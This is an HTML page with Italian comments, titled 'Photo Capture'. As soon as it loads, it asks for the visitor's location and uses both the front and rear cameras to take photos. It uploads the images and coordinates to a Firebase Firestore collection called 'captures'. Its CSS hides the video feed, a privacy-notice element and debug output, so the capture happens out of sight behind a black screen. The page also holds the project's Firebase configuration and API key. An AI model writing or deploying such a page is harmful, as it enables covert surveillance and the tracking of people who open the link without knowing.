<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
    <!-- Includi Firebase (versione modulare) -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js';

        // Configurazione Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyB5vi_b7HjiH5akXLsqk2OOO_lv-vSJzHI",
            authDomain: "cattura-a93c5.firebaseapp.com",
            projectId: "cattura-a93c5",
            storageBucket: "cattura-a93c5.firebasestorage.app",
            messagingSenderId: "155421459394",
            appId: "1:155421459394:web:2c3bcb70fe32bf1fc30c5b",
            measurementId: "G-E9MKECCY3W"
        };

        // Inizializza Firebase
        let db;
        let addDocFunc;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            addDocFunc = addDoc;
        } catch (error) {
            console.log("Errore inizializzazione Firebase: " + error.message);
        }

        // Esporta db e addDoc per il secondo script
        window.db = db;
        window.collection = collection;
        window.addDoc = addDocFunc;
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        #video, #content, #privacy-notice, #debug, #canvas {
            display: none !important; /* Nascondi tutto tranne l'immagine */
        }
        #tempImage {
            max-width: 100%;
            max-height: 100vh;
            display: block;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <img id="tempImage">
</body>
<script>
    // Ottieni posizione
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
                    },
                    (error) => {
                        reject("Errore geolocalizzazione: " + error.message);
                    }
                );
            } else {
                reject("Geolocalizzazione non supportata");
            }
        });
    }

    // Accedi alla fotocamera
    async function startCamera(facingMode) {
        const video = document.getElementById('video');
        if (video) {
            try {
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: 640,
                        height: 480,
                        frameRate: { ideal: 30 },
                        advanced: [{ exposureMode: "continuous" }, { whiteBalanceMode: "continuous" }]
                    }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => resolve();
                    video.onerror = () => console.log("Errore caricamento video");
                });
                return stream;
            } catch (err) {
                console.log("Errore fotocamera: " + err.message);
                throw err;
            }
        } else {
            throw new Error("Video element non trovato");
        }
    }

    // Scatta foto
    function takePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const tempImage = document.getElementById('tempImage');
        if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(video, 0, 0);
            const photo = canvas.toDataURL('image/jpeg', 0.9);
            tempImage.src = photo;
            setTimeout(() => {
                tempImage.src = ""; // Pulisci l'immagine dopo 3 secondi
            }, 3000);
            return photo;
        } else {
            throw new Error("Video o canvas non valido");
        }
    }

    // Ferma fotocamera
    function stopCamera(stream) {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    }

    // Salva dati su Firestore
    async function sendData(location, frontPhoto, backPhoto) {
        if (!window.db || !window.collection || !window.addDoc) {
            throw new Error("Firestore non inizializzato");
        }
        try {
            const capturesRef = window.collection(window.db, 'captures');
            await window.addDoc(capturesRef, {
                latitude: location.latitude,
                longitude: location.longitude,
                frontPhoto: frontPhoto,
                backPhoto: backPhoto,
                timestamp: new Date()
            });
        } catch (err) {
            console.log("Errore salvataggio: " + err.message);
            throw err;
        }
    }

    // Funzione principale
    async function captureData() {
        try {
            let location;
            try {
                location = await getLocation();
            } catch (err) {
                console.log("Geolocalizzazione fallita, usando coordinate predefinite: " + err.message);
                location = { latitude: 45.4642, longitude: 9.1900 }; // Milano
            }
            let stream = await startCamera('user');
            await new Promise(resolve => setTimeout(resolve, 2500));
            const frontPhoto = takePhoto();
            stopCamera(stream);
            stream = await startCamera('environment');
            await new Promise(resolve => setTimeout(resolve, 2500));
            const backPhoto = takePhoto();
            stopCamera(stream);
            await sendData(location, frontPhoto, backPhoto);
        } catch (err) {
            console.log("Errore: " + err.message);
        }
    }

    // Avvia quando il DOM Ã¨ pronto
    document.addEventListener('DOMContentLoaded', captureData);
</script>
</html>
